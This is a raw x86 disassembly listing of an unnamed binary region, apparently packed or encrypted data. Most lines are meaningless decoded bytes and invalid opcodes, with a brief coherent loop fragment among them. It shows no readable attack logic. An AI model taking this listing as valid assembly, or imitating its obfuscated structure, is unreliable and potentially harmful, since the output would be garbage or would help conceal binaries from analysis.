  4202ab:	(bad)  
  4202ac:	scas   eax,DWORD PTR es:[edi]
  4202ad:	in     eax,0xd6
  4202af:	test   al,0xa5
  4202b1:	daa    
  4202b2:	shl    cl,cl
  4202b4:	cmp    eax,0x42a2d352
  4202b9:	imul   esi,DWORD PTR [edx-0x3c492c5f],0x70
  4202c0:	mov    bl,0xd4
  4202c2:	or     edx,DWORD PTR [eax-0x79]
  4202c5:	clc    
  4202c6:	(bad)  
  4202c7:	stos   DWORD PTR es:[edi],eax
  4202c8:	jne    0x4202e1
  4202ca:	lea    ebp,[edi]
  4202cc:	lea    edi,[edx-0x315f436f]
  4202d2:	(bad)  
  4202d3:	call   0xce15ab78
  4202d8:	lahf   
  4202d9:	jp     0x4202e6
  4202db:	ss dec edi
  4202dd:	outs   dx,DWORD PTR ds:[esi]
  4202de:	jno    0x420358
  4202e0:	pop    edi
  4202e1:	adc    dl,BYTE PTR [eax]
  4202e3:	and    DWORD PTR [edi+0x73836e89],ebx
  4202e9:	push   esp
  4202ea:	jg     0x42026f
  4202ec:	out    0x6a,eax
  4202ee:	aad    0xcc
  4202f0:	and    BYTE PTR [edi],ch
  4202f2:	mov    bh,0x41
  4202f4:	(bad)  
  4202f5:	inc    esi
  4202f6:	adc    al,0x57
  4202f8:	scas   al,BYTE PTR es:[edi]
  4202f9:	test   DWORD PTR [ecx+eax*2],ebx
  4202fc:	xor    edx,DWORD PTR [ebp+0x6614b2a3]
  420302:	icebp  
  420303:	icebp  
  420304:	(bad)  
  420305:	fist   WORD PTR [esi+edx*1+0x202bd184]
  42030c:	test   eax,0x2d76b428
  420311:	push   ecx
  420312:	pusha  
  420313:	jb     0x420377
  420315:	outs   dx,DWORD PTR ds:[esi]
  420316:	test   eax,0x5be04e2
  42031b:	push   ebx
  42031c:	or     al,0x28
  42031e:	sbb    ecx,edi
  420320:	xor    edx,DWORD PTR [ecx]
  420322:	sub    DWORD PTR [ebp+0x4e9e5ff0],0xffffffa5
  420329:	push   ds
  42032a:	pop    edi
  42032b:	xchg   ebx,eax
  42032c:	xchg   ebp,eax
  42032d:	rcl    esp,cl
  42032f:	pusha  
  420330:	(bad)  
  420332:	inc    edx
  420333:	inc    ebp
  420334:	(bad)  
  420335:	jo     0x4202f2
  420337:	cmp    BYTE PTR [ebx-0x7b72f7b3],cl
  42033d:	add    ecx,edi
  42033f:	mov    bh,0xac
  420341:	loopne 0x4202ce
  420343:	lea    edx,[eax]
  420345:	(bad)  
  420346:	(bad)  
  420347:	inc    DWORD PTR [ecx+0x4108e1]
  42034d:	add    BYTE PTR [ecx+0x40e7e1],al
  420353:	add    BYTE PTR [ecx+0x1a54e9],al
  420359:	add    BYTE PTR [ecx+0x25acf1],al
  42035f:	add    BYTE PTR [ebx-0x1036b],cl
  420365:	(bad)  
  420366:	jmp    0x42074d
  42036b:	pop    eax
  42036c:	dec    ecx
  42036d:	xchg   esi,eax
  42036e:	jmp    0x42030c
  420370:	cmp    al,0xbc
  420372:	jns    0x4203a4
  420374:	inc    edx
  420375:	aad    0xe3
  420377:	mov    edx,0xefd16867
  42037c:	popf   
  42037d:	sar    BYTE PTR [esi-0x41413bb6],0x65
  420384:	dec    esi
  420385:	arpl   cx,bx
  420387:	cmp    al,0x83
  420389:	popf   
  42038a:	int3   
  42038b:	push   ss
  42038c:	jp     0x42036b
  42038e:	mov    ah,0x8c
  420390:	mul    DWORD PTR [ebp+0x7e]
  420393:	mov    bl,BYTE PTR ds:0x62e9c055
  420399:	push   esp
  42039a:	push   ecx
  42039b:	sub    DWORD PTR [ebp-0x71],edi
  42039e:	pop    es
  42039f:	je     0x420331
  4203a1:	(bad)  [edi+0x74]
  4203a4:	push   ecx
  4203a5:	cdq    
  4203a6:	sbb    ch,0x3a
  4203a9:	lock cmc 
  4203ab:	stos   DWORD PTR es:[edi],eax
  4203ac:	arpl   WORD PTR ds:0xdc0f2f45,dx
  4203b2:	hlt    
  4203b3:	hlt    
  4203b4:	popf   
  4203b5:	push   0x2c
  4203b7:	and    al,0x3
  4203b9:	inc    ebx
  4203ba:	push   0x4f7b287f
  4203bf:	adc    bh,bl
  4203c1:	mov    ecx,0x699d0807
  4203c6:	aas    
  4203c7:	inc    edx
  4203c8:	add    eax,0x81338788
  4203cd:	adc    eax,0x3f969750
  4203d2:	(bad)  
  4203d3:	fst    DWORD PTR [eax]
  4203d5:	jmp    0x2963:0x7db377f2
  4203dc:	out    0x3c,eax
  4203de:	jne    0x420400
  4203e0:	les    ecx,FWORD PTR [eax]
  4203e2:	jo     0x420432
  4203e4:	inc    ebx
  4203e5:	and    al,dl
  4203e7:	xor    eax,0xf0259d51
  4203ec:	sti    
  4203ed:	xor    al,0x69
  4203ef:	out    0x18,al
  4203f1:	inc    ebx
  4203f2:	cmp    BYTE PTR [edx-0x64],0x99
  4203f6:	cmp    esp,DWORD PTR [ebx+0x670f7d62]
  4203fc:	adc    BYTE PTR [edx+ebx*2-0x69],0x3b
  420401:	sahf   
  420402:	or     BYTE PTR [ecx],ch
  420404:	cdq    
  420405:	xor    eax,0x365254b8
  42040a:	sub    eax,0xeff31388
  42040f:	pop    ss
  420410:	xchg   ecx,eax
  420411:	push   esp
  420412:	push   esp
  420413:	aas    
  420414:	fnstcw WORD PTR ds:0x95ff9f97
  42041a:	out    dx,al
  42041b:	ja     0x42042b
  42041d:	out    dx,eax
  42041e:	js     0x420406
  420420:	sti    
  420421:	pop    edx
  420422:	adc    al,0xbd
  420424:	stc    
  420425:	xor    eax,0xaa7b0d41
  42042a:	shl    DWORD PTR [edi],cl
  42042c:	or     al,0xff
  42042e:	out    dx,al
  42042f:	sub    al,0x7
  420431:	sub    esp,DWORD PTR ds:0xfe705d5a
  420437:	(bad)  
  420438:	scas   al,BYTE PTR es:[edi]
  420439:	sub    ch,dh
  42043b:	ds fcmovb st,st(2)
  42043e:	adc    BYTE PTR [edx-0x5407275],ah
  420444:	gs xor edi,esi
  420447:	jge    0x420427
  420449:	adc    BYTE PTR [edx+0x5583cdda],bl
  42044f:	rcr    ah,0x32
  420452:	jecxz  0x420460
  420454:	in     al,dx
  420455:	(bad)  
  420456:	adc    ch,BYTE PTR fs:[ebp-0x25]
  42045a:	cmp    DWORD PTR [ebp-0x26],ebp
  42045d:	imul   BYTE PTR [ecx+0x30]
  420460:	fidiv  WORD PTR [edx]
  420462:	(bad)  
  420463:	popa   
  420464:	data16 sbb BYTE PTR [esi+0x403fcf8d],0x85
  42046c:	dec    ebx
  42046d:	xchg   ebx,eax
  42046e:	inc    edi
  42046f:	jg     0x42047f
  420471:	inc    esi
  420472:	xchg   bl,dl
  420474:	dec    ebx
  420475:	int3   
  420476:	mov    ecx,0xbd6c1ab3
  42047b:	pop    esp
  42047c:	in     eax,0x67
  42047e:	pop    ss
  42047f:	(bad)  
  420480:	cmp    al,0xd4
  420482:	sbb    dh,BYTE PTR [edx+0x7]
  420485:	jle    0x42040a
  420487:	pop    edx
  420488:	xchg   ecx,eax
  420489:	loop   0x420506
  42048b:	push   cs
  42048c:	mul    BYTE PTR [ebp+0x8e990ef]
  420492:	sub    DWORD PTR [eax+0x2324dc22],edi
  420498:	mov    edx,0xf8c97162
  42049d:	retf   0xa910
  4204a0:	inc    edi
  4204a1:	repz lds ebp,FWORD PTR [eax-0x43272b42]
  4204a8:	retf   
  4204a9:	adc    al,0x8f
  4204ab:	jle    0x420502
  4204ad:	mov    eax,ds:0x894dd225
  4204b2:	(bad)  [ebx*8+0x33ddb705]
  4204b9:	xor    eax,0xbffcea99
  4204be:	or     BYTE PTR [ebx*8+0x4d9c7666],cl
  4204c5:	fldenv [ebp-0x6c]
  4204c8:	jno    0x42049d
  4204ca:	rcr    BYTE PTR [ebp-0x6c149dbf],0x97
  4204d1:	mov    eax,cs:0x467ebbc1
  4204d7:	iret   
  4204d8:	out    dx,al
  4204d9:	nop
  4204da:	adc    BYTE PTR [edi-0x80],0x2c
  4204de:	xor    DWORD PTR [ecx+0x6],0x2130c127
  4204e5:	imul   edi,edx,0x9c8e6758
  4204eb:	jne    0x42053c
  4204ed:	enter  0xb5d0,0xc
  4204f1:	mov    al,ds:0x17b9b7a
  4204f6:	mov    ebx,0xf0140d74
  4204fb:	jge    0x420573
  4204fd:	mov    edx,0x7348af0d
  420502:	(bad)
  420505:	pop    ecx
  420506:	sahf   
  420507:	and    BYTE PTR [esi],dl
  420509:	sbb    DWORD PTR [ebx+0x65493ef1],0x15
  420510:	add    eax,0x4d6d762f
  420515:	das    
  420516:	push   ss
  420517:	arpl   WORD PTR [ebx],sp
  420519:	push   ecx
  42051a:	int3   
  42051b:	or     eax,0xba23148c
  420520:	fucom  st(2)
  420522:	int    0x5b
  420524:	cli    
  420525:	sbb    al,0x9f
  420527:	in     al,0xb3
  420529:	stc    
  42052a:	pushf  
  42052b:	fist   WORD PTR [edx+0x15923cc9]
  420531:	(bad)  
  420533:	xchg   dh,ch
  420535:	jo     0x4204d0
  420537:	or     eax,0xde8849e2
  42053c:	adc    BYTE PTR [esi],cl
  42053e:	lea    edi,[ebx-0x73df8c40]
  420544:	je     0x4204c9
  420546:	fist   WORD PTR [edi+0x5c]
  420549:	push   esp
  42054a:	int3   
  42054b:	add    BYTE PTR [esi-0x56],ah
  42054e:	pop    esi
  42054f:	push   ebx
  420550:	cmp    eax,0x866e6e3a
  420555:	xor    edi,DWORD PTR [ebx]
  420557:	jbe    0x420563
  420559:	test   al,0x7d
  42055b:	and    eax,0x89872c5a
  420560:	cmp    al,0x97
  420562:	in     al,dx
  420563:	loopne 0x420510
  420565:	popf   
  420566:	cld    
  420567:	fidiv  DWORD PTR [ebx+0x6e7b7765]
  42056d:	mov    bl,0x6a
  42056f:	retf   
  420570:	ins    BYTE PTR es:[edi],dx
  420571:	sbb    eax,0xcc620b53
  420576:	sub    ebx,0x5dbbc0a0
  42057c:	jns    0x209b4faa
  420582:	lea    edi,[ecx+0x6]
  420585:	mov    al,0x54
  420587:	xchg   DWORD PTR [ebx],eax
  420589:	cmp    eax,0xe62cebd
  42058e:	mov    ebx,0xadf34951
  420593:	leave  
  420594:	jnp    0x42054b
  420596:	mov    bh,0xba
  420598:	jae    0x420586
  42059a:	mov    dl,0xf0
  42059c:	mov    ebp,0x18c8a87e
  4205a1:	jl     0x4205b0
  4205a3:	mov    eax,0x35806530
  4205a8:	icebp  
  4205a9:	mov    ebp,0x8b7e62ca
  4205ae:	icebp  
  4205af:	add    DWORD PTR [edx],edi
  4205b1:	(bad)  
  4205b2:	mov    dl,0x7
  4205b4:	mov    esi,0xfb7c0a9
  4205b9:	pushf  
  4205ba:	rcr    ecx,0x7c
  4205bd:	jge    0x420559
  4205bf:	sar    BYTE PTR [ecx],1
  4205c1:	es add ebp,esi
  4205c4:	or     edi,DWORD PTR [edx-0xbb962c7]
  4205ca:	outs   dx,DWORD PTR ds:[esi]
  4205cb:	cli    
  4205cc:	pop    edi
  4205cd:	sti    
  4205ce:	jecxz  0x4205c8
  4205d0:	lods   eax,DWORD PTR ds:[esi]
  4205d1:	mov    al,0xf
  4205d3:	mov    bl,0xf4
  4205d5:	scas   eax,DWORD PTR es:[edi]
  4205d6:	aad    0x15
  4205d8:	sub    DWORD PTR [ebp-0x37],0xfffffff7
  4205dc:	fmulp  st(5),st
  4205de:	cmp    eax,0x62db0da2
  4205e3:	outs   dx,DWORD PTR ds:[esi]
  4205e4:	call   0x3cc5:0x5727c6b
  4205eb:	fld    DWORD PTR cs:[edi-0x17a8b448]
  4205f2:	xor    eax,DWORD PTR [eax-0x2f]
  4205f5:	adc    eax,DWORD PTR [esi+0x10]
  4205f8:	sub    eax,0x3734602e
  4205fd:	fsub   st(7),st
  4205ff:	cvtps2pd xmm6,QWORD PTR [edx]
  420602:	imul   ebp,DWORD PTR [ebx+esi*8],0xffffffd0
  420606:	call   0x479d44fc
  42060b:	lds    edx,FWORD PTR [esi]
  42060d:	jno    0x4205ca
  42060f:	jp     0x42068c
  420611:	lss    esi,FWORD PTR [ebp+ecx*4+0x64e0cc56]
  420619:	dec    esi
  42061a:	jno    0x42059f
  42061c:	inc    ebp
  42061d:	mov    ebx,0x1dc14dc
  420622:	xor    al,0x2f
  420624:	in     eax,0xa7
  420626:	sub    edx,esp
  420628:	jae    0x420670
  42062a:	push   0xffffff9a
  42062c:	repz lahf 
  42062e:	mov    ebx,0x8c9b2faa
  420633:	shl    dl,cl
  420635:	xchg   esi,eax
  420636:	es mov esi,0x998c44b1
  42063c:	xor    BYTE PTR [ebx+0x5f],ch
  42063f:	mov    esp,0x8d536d8c
  420644:	xlat   BYTE PTR ds:[ebx]
  420645:	ins    DWORD PTR es:[edi],dx
  420646:	test   al,0x1a
  420648:	mov    dl,0x2
  42064a:	mov    dh,0x45
  42064c:	adc    al,0xdb
  42064e:	xchg   ebx,eax
  42064f:	mov    ah,0x38
  420651:	popa   
  420652:	jae    0x4206cb
  420654:	fs cmc 
  420656:	jmp    0x6936:0xc71841af
  42065d:	dec    esp
  42065e:	loope  0x4206b5
  420660:	loope  0x420623
  420662:	cmp    eax,edi
  420664:	retf   0xe167
  420667:	add    BYTE PTR [edx-0x45],dh
  42066a:	bound  esi,QWORD PTR [ebx+edi*4]
  42066d:	out    0x23,al
  42066f:	aad    0x97
  420671:	jl     0x420685
  420673:	mov    ?,WORD PTR [edx]
  420675:	loopne 0x420681
  420677:	pop    ds
  420678:	pop    esi
  420679:	icebp  
  42067a:	fisttp DWORD PTR [ecx]
  42067c:	jp     0x4206ee
  42067e:	inc    ecx
  42067f:	add    al,0x85
  420681:	cmp    al,0xd9
  420683:	dec    esp
  420684:	cdq    
  420685:	xor    eax,0x21648135
  42068a:	xchg   ebx,eax
  42068b:	xor    DWORD PTR [ecx+0x391f4592],edx
  420691:	test   al,0x37
  420693:	cmc    
  420694:	pop    ebx
  420695:	push   esp
  420696:	xchg   edi,eax
  420697:	cwde   
  420698:	pop    ebp
  420699:	xchg   ebx,eax
  42069a:	mov    DWORD PTR [esi],edi
  42069c:	push   ds
  42069d:	dec    ebp
  42069e:	jns    0x420642
  4206a0:	mov    ch,cl
  4206a2:	dec    BYTE PTR [ecx+0x3b8259b0]
  4206a8:	add    edi,edx
  4206aa:	pop    ebx
  4206ab:	xor    DWORD PTR [eax+eax*1-0xaaa1d57],edx
  4206b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206b3:	and    ah,bh
  4206b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206b6:	pop    eax
  4206b7:	inc    edi
  4206b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206b9:	popa   
  4206ba:	mov    ebp,0xdfa68798
  4206bf:	lea    ebp,[ecx-0x5c]
  4206c2:	sub    BYTE PTR gs:[ebp+0x61ef0b7e],dh
  4206c9:	inc    edi
  4206ca:	sbb    BYTE PTR [eax+edi*8-0x66],bl
  4206ce:	ret    0x7c92
  4206d1:	push   esi
  4206d2:	fldcw  WORD PTR [eax+edx*4+0x7246eb81]
  4206d9:	push   esi
  4206da:	ds ja  0x4206b0
  4206dd:	push   ebp
  4206de:	sbb    al,0x52
  4206e0:	dec    ebp
  4206e1:	mov    al,0x84
  4206e3:	retf   
  4206e4:	or     eax,0x9c56ea96
  4206e9:	hlt    
  4206ea:	test   eax,0x350de96
  4206ef:	sub    DWORD PTR [ecx+0x6c],ecx
  4206f2:	pushf  
  4206f3:	out    dx,eax
  4206f4:	mov    bh,0x81
  4206f6:	lahf   
  4206f7:	add    edi,esi
  4206f9:	inc    ebp
  4206fa:	jp     0x4206ee
  4206fc:	jb     0x420700
  4206fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ff:	mov    ebp,0xc74c4efa
  420704:	push   ebx
  420705:	out    0xef,eax
  420707:	mov    edx,fs
  420709:	aad    0x20
  42070b:	pop    ebx
  42070c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42070d:	nop
  42070e:	sub    al,0x6b
  420710:	(bad)  
  420711:	(bad)  
  420713:	or     dh,BYTE PTR [ebx-0x2c6f6df2]
  420719:	mov    edi,0x947bcf4b
  42071e:	lahf   
  42071f:	push   ebp
  420720:	cmp    edi,0x1b962831
  420726:	jmp    0xce6ea05c
  42072b:	push   edi
  42072c:	sub    ecx,esi
  42072e:	iret   
  42072f:	call   0x5a7:0xb0d937b0
  420736:	xchg   DWORD PTR [eax-0x6ab9e99e],eax
  42073c:	mov    esi,0x2d9bd5d4
  420741:	mov    eax,ds:0x2b0ad242
  420746:	jnp    0x42071b
  420748:	and    BYTE PTR [eax-0x2a],dl
  42074b:	retf   0x81dc
  42074e:	repnz fisubr DWORD PTR [ebp+0x0]
  420752:	add    BYTE PTR [ebx-0x1074b],cl
  420758:	jmp    DWORD PTR [ebx]
  42075a:	(bad)  
  42075b:	and    edx,0xe0c
  420761:	or     edx,0x5b
  420764:	mov    esi,DWORD PTR [ebp-0xe8]
  42076a:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42076e:	add    ecx,eax
  420770:	lea    eax,[edx+ecx*1-0xc5b]
  420777:	mov    DWORD PTR [ebp-0xa8],eax
  42077d:	and    DWORD PTR [ebp-0x144],0x0
  420784:	jmp    0x420b7d
  420789:	mov    eax,DWORD PTR [ebp-0x144]
  42078f:	inc    eax
  420790:	mov    DWORD PTR [ebp-0x144],eax
  420796:	jmp    0x420b7d
  42079b:	daa    
  42079c:	cmp    eax,0x75b775ce
  4207a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a2:	(bad)  
  4207a3:	xchg   ecx,eax
  4207a4:	(bad)  
  4207a5:	dec    esi
  4207a6:	sahf   
  4207a7:	mov    dh,0x1a
  4207a9:	xchg   edx,eax
  4207aa:	nop
  4207ab:	jl     0x420750
  4207ad:	sar    BYTE PTR [esi-0x41413bb6],0x77
  4207b4:	add    eax,0xf1c4c216
  4207b9:	iret   
  4207ba:	and    ebp,DWORD PTR [edi+0x47c58d3e]
  4207c0:	stos   BYTE PTR es:[edi],al
  4207c1:	push   ebx
  4207c2:	es ss cli 
  4207c5:	inc    eax
  4207c6:	mov    esp,0x5b9ba540
  4207cb:	test   al,0xae
  4207cd:	loope  0x420830
  4207cf:	mov    esi,0x370c1764
  4207d4:	pusha  
  4207d5:	add    BYTE PTR [ebx+0x6b76bce9],dl
  4207db:	pop    edx
  4207dc:	push   ebx
  4207dd:	adc    bh,al
  4207df:	push   ebx
  4207e0:	and    al,ah
  4207e2:	or     ebp,DWORD PTR [esi-0xa]
  4207e5:	mov    ebp,0x82dbefed
  4207ea:	data16 mov BYTE PTR [eax],al
  4207ed:	or     DWORD PTR [eax-0xba050ad],ecx
  4207f3:	jecxz  0x4207ff
  4207f5:	xlat   BYTE PTR ds:[ebx]
  4207f6:	cli    
  4207f7:	sub    DWORD PTR [ecx-0x80],0xffffff87
  4207fb:	mov    bh,0x87
  4207fd:	xor    eax,DWORD PTR [edi-0x6d]
  420800:	jno    0x4207a3
  420802:	loop   0x420837
  420804:	cld    
  420805:	mov    esp,0x2c0788bb
  42080a:	int3   
  42080b:	cmc    
  42080c:	retf   0x5df4
  42080f:	vminps ymm1,ymm2,YMMWORD PTR [ebp-0x14]
  420814:	push   ebp
  420815:	dec    edx
  420816:	(bad)  
  420817:	fdivp  st(7),st
  420819:	call   0xbe557f94
  42081e:	cmc    
  42081f:	js     0x4207b1
  420821:	repz pop edi
  420823:	sahf   
  420824:	test   DWORD PTR [eax+0xf678671],ebx
  42082a:	jae    0x42082d
  42082c:	iret   
  42082d:	(bad)  
  42082e:	js     0x420802
  420830:	jl     0x420888
  420832:	dec    ebx
  420833:	xor    al,0x79
  420835:	leave  
  420836:	xchg   edi,eax
  420837:	pop    esi
  420838:	cli    
  420839:	lods   al,BYTE PTR ds:[esi]
  42083a:	sbb    ecx,DWORD PTR [esi-0x7b]
  42083d:	cmc    
  42083e:	sub    al,al
  420840:	loop   0x420819
  420842:	dec    ecx
  420843:	les    ebp,FWORD PTR [eax+0xeee9df1]
  420849:	shl    BYTE PTR [esi+eiz*2+0xfa1ce37],0xc9
  420851:	ficomp WORD PTR ds:0x72b71aa6
  420857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420858:	xchg   ebx,eax
  420859:	xlat   BYTE PTR ds:[ebx]
  42085a:	imul   edx,DWORD PTR [edx],0x57
  42085d:	in     al,dx
  42085e:	popf   
  42085f:	int    0xa5
  420861:	sub    dl,0x30
  420864:	xchg   ebx,eax
  420865:	mov    ebx,0x719676a4
  42086a:	fcom   DWORD PTR [ebp-0x74d9fa29]
  420870:	pop    ds
  420871:	es dec ecx
  420873:	jg     0x420824
  420875:	data16 fild WORD PTR [ecx]
  420878:	pop    edx
  420879:	test   al,0xa9
  42087b:	jbe    0x4208ed
  42087d:	mov    cl,0x26
  42087f:	ss popa 
  420881:	jp     0x420842
  420883:	sub    al,0x85
  420885:	xchg   edx,eax
  420886:	xchg   cl,ch
  420888:	push   edx
  420889:	push   esi
  42088a:	pop    esp
  42088b:	sub    edx,ecx
  42088d:	and    BYTE PTR [eax],0x39
  420890:	ins    DWORD PTR es:[edi],dx
  420891:	ror    DWORD PTR [ecx-0xf],1
  420894:	lahf   
  420895:	ins    BYTE PTR es:[edi],dx
  420896:	test   dh,bl
  420898:	int    0x79
  42089a:	mov    eax,ds:0x15d14247
  42089f:	mov    bl,0x19
  4208a1:	push   esp
  4208a2:	pop    eax
  4208a3:	sub    BYTE PTR [edi-0x460ef44f],dh
  4208a9:	ss out dx,eax
  4208ab:	and    DWORD PTR [ebx-0x17],ebx
  4208ae:	push   edx
  4208af:	and    eax,0xbb1b1df2
  4208b4:	retf   0x901
  4208b7:	add    BYTE PTR [ebx],ah
  4208b9:	jg     0x420883
  4208bb:	sub    DWORD PTR [ecx],esp
  4208bd:	inc    esp
  4208be:	test   al,0x43
  4208c0:	fcomi  st,st(1)
  4208c2:	mov    dh,ch
  4208c4:	icebp  
  4208c5:	call   0x11ff:0x4007db94
  4208cc:	sbb    WORD PTR [esi-0x28c38739],sp
  4208d3:	jl     0x420912
  4208d5:	iret   
  4208d6:	ss je  0x42088e
  4208d9:	scas   al,BYTE PTR es:[edi]
  4208da:	dec    BYTE PTR [edx-0x14]
  4208dd:	and    DWORD PTR [edi+0x6abc7a3f],ebp
  4208e3:	call   0x3004:0xd6ee36ac
  4208ea:	into   
  4208eb:	leave  
  4208ec:	(bad)  
  4208ed:	or     eax,0x74308940
  4208f2:	and    al,0xd8
  4208f4:	lods   eax,DWORD PTR ds:[esi]
  4208f5:	rcr    dl,1
  4208f7:	lds    esp,FWORD PTR [ecx+eiz*2+0x67]
  4208fb:	sbb    cl,dh
  4208fd:	sub    edi,DWORD PTR [edi]
  4208ff:	mov    al,ds:0x1f3d1981
  420904:	xchg   edx,eax
  420905:	ja     0x4208d9
  420907:	bound  edx,QWORD PTR [edx+0xc]
  42090a:	mov    al,0xa2
  42090c:	int3   
  42090d:	adc    al,0xb2
  42090f:	sbb    al,0x58
  420911:	fs jp  0x4208bf
  420914:	sbb    eax,0xa2e24478
  420919:	jmp    0x4208c5
  42091b:	jle    0x4208a6
  42091d:	rol    eax,0xd0
  420920:	imul   eax,DWORD PTR [edi+0x28],0x60
  420924:	lock std 
  420926:	pop    edi
  420927:	rcr    DWORD PTR [ecx-0x1428d58f],1
  42092d:	fbstp  TBYTE PTR [ebp-0x33800613]
  420933:	sahf   
  420934:	xchg   ebp,eax
  420935:	mov    ecx,0x44a8bcd4
  42093a:	xor    DWORD PTR [esi+0x750d1005],eax
  420940:	dec    ecx
  420941:	pop    esi
  420942:	or     BYTE PTR [ebx-0x4b],cl
  420945:	cmp    BYTE PTR [ebp-0x44],bl
  420948:	jl     0x420969
  42094a:	mov    edx,0xe23ba745
  42094f:	dec    edi
  420950:	mov    bh,0x39
  420952:	clc    
  420953:	xor    esi,DWORD PTR [edx-0x6f]
  420956:	mov    ss,esi
  420958:	daa    
  420959:	push   esi
  42095a:	mov    BYTE PTR [esi],dl
  42095c:	mov    bl,bh
  42095e:	sbb    edi,DWORD PTR [esi+0x1fff2ed4]
  420964:	sbb    al,0xaa
  420966:	scas   al,BYTE PTR es:[edi]
  420967:	iret   
  420968:	dec    ecx
  420969:	mov    ecx,0x19840f81
  42096e:	outs   dx,DWORD PTR ds:[esi]
  42096f:	adc    ecx,esp
  420971:	lods   eax,DWORD PTR ds:[esi]
  420972:	push   ebp
  420973:	(bad)  
  420974:	fdivr  DWORD PTR [eax+ebx*8+0xf77f2be]
  42097b:	jne    0x420912
  42097d:	push   ss
  42097e:	inc    esp
  42097f:	dec    ebx
  420980:	cmp    cl,BYTE PTR [eax]
  420982:	sti    
  420983:	xchg   esp,eax
  420984:	fisubr WORD PTR [ebp+0x27]
  420987:	sar    DWORD PTR [ecx+0xb],cl
  42098a:	pop    ecx
  42098b:	xchg   ecx,eax
  42098c:	data16 aad 0xf0
  42098f:	adc    BYTE PTR [esi+0x7e],bl
  420992:	sub    al,bh
  420994:	jmp    0xd6a9133d
  420999:	push   ebp
  42099a:	mov    BYTE PTR [edi+0x48],bh
  42099d:	in     al,dx
  42099e:	cmp    al,0xd7
  4209a0:	jo     0x420946
  4209a2:	fcmovu st,st(3)
  4209a4:	add    eax,0x58c54682
  4209a9:	inc    edi
  4209aa:	cmp    BYTE PTR [edx+0x30],dl
  4209ad:	push   esp
  4209ae:	dec    ebx
  4209af:	inc    edi
  4209b0:	cmp    al,BYTE PTR [ebx]
  4209b2:	or     eax,0x8c12dc2b
  4209b7:	inc    edi
  4209b8:	mov    cl,BYTE PTR [ecx-0x23]
  4209bb:	add    eax,0xaf1a8cc5
  4209c0:	daa    
  4209c1:	fnsave [edx+0x17]
  4209c4:	arpl   WORD PTR [ebp-0x46],bp
  4209c7:	jae    0x4209bc
  4209c9:	ret    
  4209ca:	adc    eax,0xfcee27f3
  4209cf:	lock sub BYTE PTR [eax],ah
  4209d2:	inc    esi
  4209d3:	cmp    ebp,DWORD PTR [ebx+0x5141477]
  4209d9:	jg     0x420a2b
  4209db:	mov    esp,DWORD PTR [esi+eax*8-0x4e]
  4209df:	pop    ds
  4209e0:	inc    esi
  4209e1:	push   0xe06c17ac
  4209e6:	in     eax,dx
  4209e7:	imul   DWORD PTR [edi+0x7afde903]
  4209ed:	in     al,dx
  4209ee:	xchg   edx,eax
  4209ef:	in     eax,dx
  4209f0:	push   ds
  4209f1:	test   DWORD PTR [eax+0x6c],esi
  4209f4:	mov    esi,0xec988067
  4209f9:	and    ebp,ebp
  4209fb:	test   BYTE PTR [ebx+0x75],ch
  4209fe:	sbb    edx,esp
  420a00:	test   al,0xc0
  420a02:	adc    esp,DWORD PTR [edi+0x44b9bef1]
  420a08:	jns    0x420a2a
  420a0a:	mov    al,0x81
  420a0c:	jne    0x4209d7
  420a0e:	or     edi,DWORD PTR [edi-0x53]
  420a11:	sbb    ebx,edx
  420a13:	push   ecx
  420a14:	sti    
  420a15:	cwde   
  420a16:	inc    ecx
  420a17:	and    eax,0x5aee1e9b
  420a1c:	jns    0x420a75
  420a1e:	imul   ecx,DWORD PTR [edi+ebp*2-0x42],0xfffffffb
  420a23:	fild   DWORD PTR [edi+0x5bc4b05a]
  420a29:	mov    ah,0x28
  420a2b:	stc    
  420a2c:	loopne 0x420a90
  420a2e:	cmp    BYTE PTR [edi+0x10],al
  420a31:	in     al,0xfb
  420a33:	xchg   ecx,edx
  420a35:	dec    edi
  420a36:	xchg   esi,eax
  420a37:	add    DWORD PTR [edi-0x2],edx
  420a3a:	dec    edx
  420a3b:	adc    al,0x9b
  420a3d:	inc    DWORD PTR [ebx+0x71]
  420a40:	sbb    ah,BYTE PTR [esi-0x7c8513db]
  420a46:	daa    
  420a47:	mov    edi,0x5898005e
  420a4c:	lods   eax,DWORD PTR ds:[esi]
  420a4d:	mov    dl,0x3d
  420a4f:	(bad)  
  420a50:	fld    DWORD PTR [edi+eax*8+0x71]
  420a54:	into   
  420a55:	(bad)  
  420a56:	shr    ch,0x64
  420a59:	inc    eax
  420a5a:	xchg   esp,eax
  420a5b:	fcomp  QWORD PTR ds:0x4e9d965a
  420a61:	sbb    BYTE PTR gs:[ebp+0x6b],bl
  420a65:	jns    0x420a82
  420a67:	je     0x420a3f
  420a69:	jae    0x420a20
  420a6b:	mov    BYTE PTR [edx+0x74],dh
  420a6e:	ret    
  420a6f:	lods   al,BYTE PTR ds:[esi]
  420a70:	fstp   QWORD PTR [eax+edx*1]
  420a73:	xor    eax,0xfb04706
  420a78:	sub    al,0x22
  420a7a:	jmp    0x2855:0x9a735eeb
  420a81:	ss mov ch,0x76
  420a84:	cwde   
  420a85:	inc    ecx
  420a86:	(bad)  
  420a87:	xchg   edx,eax
  420a88:	mov    ecx,0x27804414
  420a8d:	xchg   ebx,eax
  420a8e:	fwait
  420a8f:	mov    ds:0xbf539611,al
  420a94:	in     al,0xa
  420a96:	retf   
  420a97:	addr16 daa 
  420a99:	(bad)  
  420a9a:	jmp    0x420ab4
  420a9c:	pop    esi
  420a9d:	fdiv   st(5),st
  420a9f:	arpl   WORD PTR [ebx],bx
  420aa1:	imul   ebp,DWORD PTR [ebp+0x5cfb5f37],0x76
  420aa8:	int3   
  420aa9:	(bad)  
  420aaa:	mov    cl,0x3b
  420aac:	xchg   esp,eax
  420aad:	jo     0x420a7c
  420aaf:	outs   dx,DWORD PTR ds:[esi]
  420ab0:	pop    ds
  420ab1:	js     0x420a53
  420ab3:	add    edx,DWORD PTR [edi]
  420ab5:	pop    edi
  420ab6:	adc    DWORD PTR [ebp+0x7],esi
  420ab9:	loop   0x420a94
  420abb:	out    0x3e,eax
  420abd:	push   ebx
  420abe:	mov    bl,0x53
